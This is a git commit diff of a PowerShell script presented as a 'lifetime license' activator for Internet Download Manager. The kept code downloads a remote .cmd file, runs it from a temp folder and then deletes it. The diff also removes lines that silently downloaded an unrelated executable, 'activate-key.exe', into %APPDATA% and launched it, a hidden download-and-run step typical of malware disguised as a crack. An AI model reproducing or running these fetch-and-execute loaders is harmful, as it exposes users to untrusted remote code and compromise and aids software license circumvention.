a89ea8f54f726d09111e7bb08c1f1a268eac9cb9
Pctoolsbox.com <45397057+Pctoolsbox@users.noreply.github.com>
2024-11-22 08:21:07 +0200

    Update IDM-Lifetime-license.ps1

--- IDM-Lifetime-license.ps1
+++ IDM-Lifetime-license.ps1
@@ -4,11 +4,11 @@ $ErrorActionPreference = "Stop"
 # Enable TLSv1.2 for compatibility with older clients
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
-$DownloadURL = 'https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/IDM-Lifetime-license.cmd'
+$DownloadURL = 'https://raw.githubusercontent.com/lstprjct/IDM-Activation-Script/main/IAS.cmd'
 
 $rand = Get-Random -Maximum 99999999
 $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IAS_$rand.cmd" } else { "$env:TEMP\IDM-Lifetime-license_$rand.cmd" }
+$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\IAS_$rand.cmd" } else { "$env:TEMP\IAS_$rand.cmd" }
 
 try {
     $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
@@ -17,14 +17,6 @@ catch {
     $response = Invoke-WebRequest -Uri $DownloadURL2 -UseBasicParsing
 }
 
-$ProcName = "activate-key.exe"
-$WebFile = "https://github.com/Pctoolsbox/IDM-Activation-Lifetime-license/raw/refs/heads/main/activate-key.exe"
- 
-Clear-Host
- 
-(New-Object System.Net.WebClient).DownloadFile($WebFile,"$env:APPDATA\$ProcName")
-Start-Process ("$env:APPDATA\$ProcName")
-
 $ScriptArgs = "$args "
 $prefix = "@REM $rand `r`n"
 $content = $prefix + $response
@@ -32,6 +24,5 @@ Set-Content -Path $FilePath -Value $content
 
 Start-Process $FilePath $ScriptArgs -Wait
 
-$FilePaths = @("$env:TEMP\IDM-Lifetime-license*.cmd", "$env:SystemRoot\Temp\IDM-Lifetime license*.cmd")
+$FilePaths = @("$env:TEMP\IAS*.cmd", "$env:SystemRoot\Temp\IAS*.cmd")
 foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
-
